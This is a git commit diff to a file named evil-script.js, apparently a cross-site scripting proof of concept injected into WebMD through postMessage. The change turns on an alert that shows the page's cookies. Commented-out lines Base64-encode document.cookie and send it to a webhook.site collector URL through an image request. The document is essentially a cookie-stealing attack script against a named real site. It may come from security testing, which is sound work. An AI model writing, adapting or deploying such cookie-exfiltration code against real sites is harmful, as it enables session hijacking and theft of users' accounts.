477711462f93a15653c48efe4633da74bc127692
egyhaker <egyhaker.s.m.y@gmail.com>
2026-02-01 02:22:28 +0200

    Update evil-script.js

--- evil-script.js
+++ evil-script.js
@@ -1,6 +1,6 @@
       // evil-script.js - PoC نظيف وبسيط
 //console.log("Evil script LOADED successfully via postMessage on WebMD!");
-//alert("XSS PoC: Script injected! Cookies visible in console: " + document.cookie);
+alert("XSS PoC: Script injected! Cookies visible in console: " + document.cookie);
          // تشفير الكوكيز بـ Base64 قبل إرسالها
 //var stolenData = btoa(document.cookie); 
 //new Image().src = "https://webhook.site/01958d43-9c63-44e0-85c8-4df93c65ec75/log?data=" + encodeURIComponent(stolenData);
